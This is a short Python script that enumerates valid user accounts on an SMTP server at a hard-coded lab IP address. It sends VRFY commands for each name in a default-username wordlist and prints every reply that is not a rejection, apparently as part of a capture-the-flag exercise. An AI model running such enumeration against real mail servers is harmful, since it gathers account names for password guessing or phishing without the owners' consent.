from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

rhost = "10.10.11.166"
rport = 25
path = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
path = "./cirt-default-usernames.txt"

server = smtplib.SMTP(host=rhost,port=rport)
if server.noop()[0] != 250:
    print("[-]Connection Error")
    sys.exit()

with open(path, "r") as f:
    users = f.read().rstrip().split("\n")

for i in users:
    vrfy = server.verify(i)
    if vrfy[0] != 550:
        print(vrfy)

